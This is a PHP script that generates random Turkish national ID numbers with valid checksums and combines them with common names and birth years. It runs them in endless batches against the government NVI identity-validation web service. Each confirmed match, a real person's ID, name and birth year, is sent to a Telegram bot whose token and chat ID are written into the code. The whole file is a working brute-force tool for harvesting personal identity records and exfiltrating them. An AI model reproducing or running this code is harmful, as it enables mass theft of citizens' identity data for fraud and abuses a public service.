<?php
header('Content-Type: text/html; charset=utf-8');
set_time_limit(30); // Render'ın bağlantıyı kesmesini önler

// --- AYARLAR ---
$botToken = "8405664089:AAEJi8ipuYWCeKpRSFFYGINACt4Sej1xeNI"; 
$chatId = "8258235296";

function telegramGonder($msg, $token, $id) {
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=" . urlencode($msg);
    @file_get_contents($url);
}

function nviSorgu($tc, $ad, $soyad, $yil) {
    $xml = '<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body><TCKimlikNoDogrula xmlns="http://tckimlik.nvi.gov.tr/WS">
      <TCKimlikNo>'.$tc.'</TCKimlikNo><Ad>'.$ad.'</Ad><Soyad>'.$soyad.'</Soyad><DogumYili>'.$yil.'</DogumYili>
      </TCKimlikNoDogrula></soap:Body></soap:Envelope>';

    $ch = curl_init("https://tckimlik.nvi.gov.tr/Service/KPSPublic.asmx");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: text/xml; charset=utf-8']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5); 
    $res = curl_exec($ch);
    curl_close($ch);
    return (strpos($res, '<TCKimlikNoDogrulaResult>true</TCKimlikNoDogrulaResult>') !== false);
}

function tcUret() {
    $n = [rand(1, 9)];
    for ($i = 1; $i < 9; $i++) $n[$i] = rand(0, 9);
    $t1 = ($n[0]+$n[2]+$n[4]+$n[6]+$n[8])*7 - ($n[1]+$n[3]+$n[5]+$n[7]);
    $h10 = $t1 % 10; if ($h10 < 0) $h10 += 10;
    $h11 = (array_sum($n) + $h10) % 10;
    return implode('', $n) . $h10 . $h11;
}

$isimler = ["MEHMET", "MUSTAFA", "AHMET", "ALİ", "HÜSEYİN", "HASAN", "AYŞE", "FATMA", "EMİNE"];
$soyisimler = ["YILMAZ", "KAYA", "DEMİR", "ŞAHİN", "ÇELİK", "YILDIZ"];

echo "<h3>Toplu Tarama Aktif (Grup: 10)</h3>";

// 10'lu paketler halinde sorgu yapar
for($i=1; $i<=10; $i++) {
    $tc = tcUret();
    $ad = $isimler[array_rand($isimler)];
    $sy = $soyisimler[array_rand($soyisimler)];
    $yil = rand(1978, 2005);
    
    echo "Sorgu $i: $tc ($ad $sy)... ";
    
    if(nviSorgu($tc, $ad, $sy, $yil)) {
        telegramGonder("✅ KİŞİ BULUNDU!\nTC: $tc\nAd: $ad $sy\nYıl: $yil", $botToken, $chatId);
        echo "<b style='color:green;'>BULUNDU!</b><br>";
    } else {
        echo "<span style='color:gray;'>Başarısız</span><br>";
    }
    
    // Tarayıcıya anlık bilgi gönderir
    echo str_repeat(' ', 1024); 
    flush(); 
    ob_flush();
    usleep(100000); // 0.1 saniye bekle
}

// Sayfayı 1 saniye sonra tazeleyerek sonsuz döngü sağlar
echo "<script>setTimeout(function(){ location.reload(); }, 1000);</script>";
echo "<p><i>Grup tamamlandı. Yeni grup 1 saniye içinde başlayacak...</i></p>";
?>
